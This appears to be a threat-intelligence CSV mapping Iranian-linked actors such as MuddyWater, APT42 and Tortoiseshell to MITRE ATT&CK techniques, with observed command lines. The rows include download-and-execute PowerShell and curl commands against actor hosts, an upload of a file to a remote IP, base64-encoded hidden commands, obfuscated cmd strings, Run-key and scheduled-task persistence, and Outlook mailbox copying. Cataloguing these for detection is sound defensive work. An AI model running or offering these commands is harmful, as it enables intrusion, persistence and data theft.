Threat Actor,Tool,Mitre Category,Mitre Technique ID,Mitre Technique Name,CLI
Cyber Av3ngers,date,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,date,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,hostname.exe,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,hostname.exe,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,hostname.exe,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,uname,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,uname,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,uname,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -Command Copy-Item -Path %%malware path%% -Destination '%ALLUSERSPROFILE%\Logs' -Force
Tortoiseshell,Systeminfo,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
Tortoiseshell,Cmd,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
Tortoiseshell,findstr,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
Tortoiseshell,rar.exe,defense-evasion,T1027,Obfuscated Files or Information,%PROGRAMFILES%\WinRAR\RAR.exe a -v1000m -m5 %PROGRAMFILES%\WinRAR\{COMPANY_NAME}.rar C:/Users/{USERNAME}/AppData/Local/Microsoft/Outlook/{TARGET_OST}
APT42,Rundll32,defense-evasion,T1218.011,Rundll32,rundll32.exe %WINDIR%\system32\davclnt.dll DavSetCookie datadrift.somee.com@SSL https://datadrift.somee.com/aoh5/[REDACTED].lnk
APT42,ren,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
APT42,Cmd,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
APT42,curl,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
APT42,Invoke-RestMethod,execution,T1059.001,PowerShell,powershell -w 1 $lb='gBjs';$uq=(invoke-restmethod -UserAgent 'Chrome' 'https://line.completely.workers.dev/aoh52');.(gcm i*ee*)$uq
APT42,PowerShell,execution,T1059.001,PowerShell,powershell -w 1 $lb='gBjs';$uq=(invoke-restmethod -UserAgent 'Chrome' 'https://line.completely.workers.dev/aoh52');.(gcm i*ee*)$uq
APT42,PowerShell,execution,T1059.001,PowerShell,powershell -w 1 $PbwpcDxXtAnaGrsu=(Get-Content -Path %LOCALAPPDATA%\Microsoft\Windows\AutoUpdate\fhgPczTORoCNEDsm.txt); &(gcm i*x)$PbwpcDxXtAnaGrsu
APT42,Console Windows Host,execution,T1059.003,Windows Command Shell,conhost --headless %PUBLIC%\Microsoft.bat
APT42,Microsoft Edge,execution,T1059.003,Windows Command Shell,msedge.exe --no-sandbox --remote-debugging-port=9222 --remote-allow-origins=ws://localhost:9222 --window-position=-32000-32000
APT42,PsSuspend,execution,T1059.003,Windows Command Shell,%LOCALAPPDATA%\Caches\pssuspend.exe -accepteula -nobanner <chrome_pid>
APT42,copy-item,execution,T1059.001,PowerShell,copy-item C:/Users/{USER}/AppData/Local/Microsoft/Outlook/@example.com.ost ` $env:APPDATA/victim@example.com.ost
APT42,Set-ItemProperty,execution,T1059.001,PowerShell,Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Renovation' -Value cmd /c \for %a in (\%localappdata%\Microsoft\Internet Explorer\List\*\) do ( start \\ \%a\ )\
APT42,curl,execution,T1059.003,Windows Command Shell,"curl.exe -X POST https://<FIREBASE-ENDPOINT>.json -H 
Content-Type: application/json -d {\LastUpdatTime\:{\.sv\:\timestamp\}} 
--ssl-no-revoke"
APT42,Microsoft Edge,execution,T1059.003,Windows Command Shell,start msedge \hxxps[://]1drv[.]ms/w/c/208F0gfdtrhkjB256/EXaIieylg5EtG6mcLAdhtdhgdytrfHM31tA?e=pjdsyyI\;
APT42,start,execution,T1059.003,Windows Command Shell,start msedge \hxxps[://]1drv[.]ms/w/c/208F0gfdtrhkjB256/EXaIieylg5EtG6mcLAdhtdhgdytrfHM31tA?e=pjdsyyI\;
APT42,ren,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\cmd.exe /c set hm=cmolbd /c colburl --ssolblno-revoolbke -o vgh.tolbxt
htolbtps[://]linolbe[.]complolbetely[.]workolbers[.]deolbv/aoh5 &
rename vgh.tolbxt temolbp.baolbt & %%tmolbp%%  & call %%hm:olb=%%"
APT42,Cmd,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\cmd.exe /c set hm=cmolbd /c colburl --ssolblno-revoolbke -o vgh.tolbxt
htolbtps[://]linolbe[.]complolbetely[.]workolbers[.]deolbv/aoh5 &
rename vgh.tolbxt temolbp.baolbt & %%tmolbp%%  & call %%hm:olb=%%"
APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d
id=CgYEFk&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://prism-
west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs & call %c:7=% &
set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,PowerShell,execution,T1059.001,PowerShell,"powershell -w 1 $Pbwpc=(Get-Content -Path
'%LOCALAPPDATA%\Microsoft\Windows\AutoUpdate\fhgPczTORoCNEDsm.txt');
 &(gcm i*x) $Pbwpc"
APT42,PowerShell,execution,T1059.001,PowerShell,"powershell -w 1 $pnt=(Get-Content -Path
%APPDATA%\Microsoft\documentLoger.txt);
&(gcm i*x)$pnt"
Tortoiseshell,Net,execution,T1059.003,Windows Command Shell,net user DC-01$ P@ssw0rd
Tortoiseshell,ssh,command-and-control,T1572,Protocol Tunneling,%WINDIR%\system32\openssh\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070
Tortoiseshell,Reg,defense-evasion,T1112,Modify Registry,reg delete HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default /va /f
Tortoiseshell,Reg,defense-evasion,T1112,Modify Registry,reg delete HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers /f
Tortoiseshell,SCCMVNC,execution,T1059.003,Windows Command Shell,SCCM.exe reconfig /target:[REDACTED]
Infy,Taskkill,defense-evasion,T1070.004,File Deletion,chcp 65001 TaskKill /F /IM 5268 Timeout /T 2 /Nobreak Del /ah
Infy,Taskkill,execution,T1059,Command and Scripting Interpreter,chcp 65001 TaskKill /F /IM 5268 Timeout /T 2 /Nobreak Del /ah
Infy,Taskkill,defense-evasion,T1070.004,File Deletion,chcp 65001 TaskKill /F /IM 8020 Timeout /T 2 /Nobreak Del /ah
Infy,Taskkill,execution,T1059,Command and Scripting Interpreter,chcp 65001 TaskKill /F /IM 8020 Timeout /T 2 /Nobreak Del /ah
MuddyWater,WinWord.exe,execution,T1059.003,Windows Command Shell,"%PROGRAMFILES%\Microsoft Office\Office16\WINWORD.EXE /n
%WINDIR%\System32\cmd.exe /c %ALLUSERSPROFILE%\CertificationKit.ini"
MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,"%PROGRAMFILES%\Microsoft Office\Office16\WINWORD.EXE /n
%WINDIR%\System32\cmd.exe /c %ALLUSERSPROFILE%\CertificationKit.ini"
MuddyWater,Schtasks.exe,execution,T1059.003,Windows Command Shell,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Schtasks.exe,command-and-control,T1105,Ingress Tool Transfer,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Cmd,command-and-control,T1105,Ingress Tool Transfer,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Cmd,execution,T1053.005,Scheduled Task,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
MuddyWater,PowerShell,exfiltration,T1041,Exfiltration Over C2 Channel,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAaAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAaAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAaAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
MuddyWater,Taskkill,execution,T1059.003,Windows Command Shell,taskkill /IM novaservice.exe
MuddyWater,Taskkill,impact,T1489,Service Stop,taskkill /IM novaservice.exe
MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,taskkill /IM novaservice.exe
MuddyWater,Cmd,impact,T1489,Service Stop,taskkill /IM novaservice.exe
MuddyWater,Start-Process,execution,T1059.001,PowerShell,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
MuddyWater,Start-Process,defense-evasion,T1564.003,Hidden Window,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
MuddyWater,PowerShell,execution,T1059.001,PowerShell,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
MuddyWater,PowerShell,exfiltration,T1041,Exfiltration Over C2 Channel,$wc = New-Object System.Net.WebClient; $wc.UploadFile(“hxxp://143[.]198[.]5[.]41:443/success”“%PUBLIC%\downloads\cobe-notes.txt”);
MuddyWater,PowerShell,execution,T1059.001,PowerShell,$wc = New-Object System.Net.WebClient; $wc.UploadFile(“hxxp://143[.]198[.]5[.]41:443/success”“%PUBLIC%\downloads\cobe-notes.txt”);
Dust Specter,exit,execution,T1059.001,PowerShell,$di='%ALLUSERSPROFILE%\WinWebex';md $di 2>;$path=$di+'\WinWebex.exe';Add-Type -A System.Net.Http;$c=New-Object System.Net.Http.HttpClient; $c.DefaultRequestHeaders.UserAgent.ParseAdd('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0');[IO.File]::WriteAllBytes($path $c.GetAsync('https://meetingapp.site/webexdownload').Result.Content.ReadAsByteArrayAsync().Result); $c.Dispose();Register-ScheduledTask -TaskName winWebex -Action (New-ScheduledTaskAction -Execute $path) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 2) -RepetitionDuration ([TimeSpan]::FromDays(9999))) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0)) -Force; Start-ScheduledTask -TaskName winWebex;exit;
Dust Specter,New-ItemProperty,execution,T1059.001,PowerShell,%ALLUSERSPROFILE%\PolGuid\WingetUI\WingetUI.exe;New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'VLC' -Value '%ALLUSERSPROFILE%\PolGuid\VLC\vlc.exe' -PropertyType String;New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WingetUI' -Value '%ALLUSERSPROFILE%\PolGuid\WingetUI\WingetUI.exe' -PropertyType String;
MuddyWater,Invoke-Expression,command-and-control,T1071.001,Web Protocols,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,Invoke-Expression,command-and-control,T1105,Ingress Tool Transfer,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,Invoke-Expression,execution,T1059.001,PowerShell,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,PowerShell,command-and-control,T1071.001,Web Protocols,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,PowerShell,command-and-control,T1105,Ingress Tool Transfer,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,PowerShell,execution,T1059.001,PowerShell,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,Invoke-WebRequest,command-and-control,T1071.001,Web Protocols,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,Invoke-WebRequest,command-and-control,T1105,Ingress Tool Transfer,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression